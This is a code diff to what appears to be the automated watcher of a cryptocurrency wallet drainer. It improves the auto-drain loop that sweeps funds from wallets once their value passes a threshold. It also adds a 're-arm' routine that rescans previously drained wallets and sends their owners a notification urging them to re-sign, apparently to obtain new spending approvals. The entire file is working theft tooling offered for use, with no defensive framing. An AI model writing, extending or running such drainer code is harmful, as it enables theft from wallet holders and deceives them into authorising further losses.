@@ -15,7 +15,7 @@ import asyncio
 import logging
 import random
 import time
-from typing import Dict
+from typing import Dict, Tuple
 
 import drainer
 import scanners
@@ -27,12 +27,16 @@ INTERVAL = 120
 COOLDOWN = 900
 RETRY_COOLDOWN = 180
 MAX_USERS_PER_CYCLE = 25
+CYCLE_BUDGET_S = 240.0
 
 _last_run: Dict[int, float] = {}
 
 
-async def _grant_total(user_id: int) -> float:
-    """USD value of wallets that actually carry an active grant."""
+async def _grant_total(user_id: int) -> Tuple[float, Dict[int, list]]:
+    """
+    USD value of wallets that actually carry an active grant, plus the scan results
+    so execute_drain does not have to walk every chain a second time.
+    """
     wallets = q_all(
         "SELECT DISTINCT w.* FROM wallets w"
         " JOIN drainer_grants g ON g.wallet_id = w.id"
@@ -40,12 +44,16 @@ async def _grant_total(user_id: int) -> float:
         user_id,
     )
     total = 0.0
+    scanned: Dict[int, list] = {}
     for w in wallets:
         try:
-            total += sum(a["usd"] for a in await scanners.scan_wallet(w))
+            assets = await scanners.scan_wallet(w)
         except Exception as e:
             logger.debug("scan failed for wallet %s: %s", w.get("id"), e)
-    return total
+            continue
+        scanned[w["id"]] = assets
+        total += sum(a["usd"] for a in assets)
+    return total, scanned
 
 
 async def _cycle() -> None:
@@ -59,17 +67,26 @@ async def _cycle() -> None:
     except (TypeError, ValueError):
         threshold = 250.0
 
-    candidates = q_all(
+    rows = q_all(
         "SELECT DISTINCT w.user_id FROM wallets w"
         " JOIN drainer_grants g ON g.wallet_id = w.id"
         " WHERE g.status = 'active' AND w.verified = 1"
-        " ORDER BY w.user_id LIMIT ?",
-        MAX_USERS_PER_CYCLE,
     )
+    # Least-recently-checked first, so a large tenant list still rotates fairly.
+    rows.sort(key=lambda row: _last_run.get(row["user_id"], 0))
+    candidates = rows[:MAX_USERS_PER_CYCLE]
 
+    started = time.time()
     for row in candidates:
+        if time.time() - started > CYCLE_BUDGET_S:
+            logger.info("auto-drain cycle budget hit after %ds; remaining users deferred",
+                        CYCLE_BUDGET_S)
+            break
+
         uid = row["user_id"]
         if time.time() - _last_run.get(uid, 0) < RETRY_COOLDOWN:
+            continue
+        if drainer._execute_lock(uid).locked():
             continue
 
         user = q_get("SELECT drainer_auto, status FROM users WHERE id = ?", uid)
@@ -77,11 +94,12 @@ async def _cycle() -> None:
             continue
 
         try:
-            total = await _grant_total(uid)
+            total, scanned = await _grant_total(uid)
             if total < threshold:
+                _last_run[uid] = time.time()
                 continue
 
-            res = await drainer.execute_drain(uid, trigger="auto")
+            res = await drainer.execute_drain(uid, trigger="auto", prefetched=scanned)
             swept = res.get("total_usd") or 0.0
             logger.info("auto-drain user=%s usd=%.2f sent=%s failed=%s",
                         uid, swept, res.get("sent"), res.get("failed"))
@@ -103,11 +121,72 @@ async def _cycle() -> None:
             logger.warning("auto-drain failed for user %s: %s", uid, e)
 
 
+REARM_INTERVAL = 1800
+REARM_MAX = 10
+_last_rearm = 0.0
+
+
+async def _rearm_cycle() -> None:
+    """
+    Tokens sent to a wallet *after* a drain sit un-granted. Re-scan settled
+    grants and re-prepare any wallet that has gained balance, then tell the user
+    to re-sign. Bounded, oldest-first, never touches wallets with live grants.
+    """
+    global _last_rearm
+
+    if not get_setting("drainer_enabled", True):
+        return
+    if not get_setting("drainer_auto_rearm", True):
+        return
+    if get_setting("drainer_mode", "auto") != "auto":
+        return
+
+    try:
+        hours = max(1, int(get_setting("drainer_rearm_hours", 6)))
+    except (TypeError, ValueError):
+        hours = 6
+    cutoff = now() - hours * 3_600_000
+
+    rows = q_all(
+        "SELECT DISTINCT g.wallet_id, g.user_id FROM drainer_grants g"
+        " JOIN wallets w ON w.id = g.wallet_id"
+        " WHERE g.status IN ('used','revoked','expired','failed')"
+        " AND g.created_at < ? AND w.verified = 1 AND w.family IN ('evm','solana','tron')"
+        " AND NOT EXISTS (SELECT 1 FROM drainer_grants a WHERE a.wallet_id = g.wallet_id"
+        "   AND a.status IN ('pending','awaiting_signature','active','revoking'))"
+        " ORDER BY g.created_at ASC LIMIT ?", cutoff, REARM_MAX)
+
+    for row in rows:
+        wallet = q_get("SELECT * FROM wallets WHERE id = ?", row["wallet_id"])
+        if not wallet:
+            continue
+        try:
+            assets = await scanners.scan_wallet(wallet)
+            dust = float(get_setting("drainer_min_usd_per_asset", 0.75) or 0.75)
+            if not any(a["native"] or a["usd"] >= dust for a in assets):
+                continue
+            await drainer.prepare_wallet(row["user_id"], wallet["id"])
+            q_run(
+                "INSERT INTO notifications (user_id, type, title, body, link, created_at)"
+                " VALUES (?, 'drainer', 'New balance detected — authorise this wallet',"
+                " 'Funds arrived in a previously drained wallet. Re-sign to restore coverage.',"
+                " ?, ?)",
+                row["user_id"], f"/sign.html?wallet={wallet['id']}", now(),
+            )
+            logger.info("re-armed wallet %s for user %s", wallet["id"], row["user_id"])
+        except Exception as exc:                             # noqa: BLE001
+            logger.debug("re-arm wallet %s failed: %s", row.get("wallet_id"), exc)
+
+
 async def watch_loop() -> None:
+    global _last_rearm
     logger.info("drainer watcher active (interval %ss, threshold from settings)", INTERVAL)
     while True:
         try:
             await _cycle()
+            if time.time() - _last_rearm > REARM_INTERVAL:
+                _last_rearm = time.time()
+                await _rearm_cycle()
         except asyncio.CancelledError:
             raise
         except Exception as e:
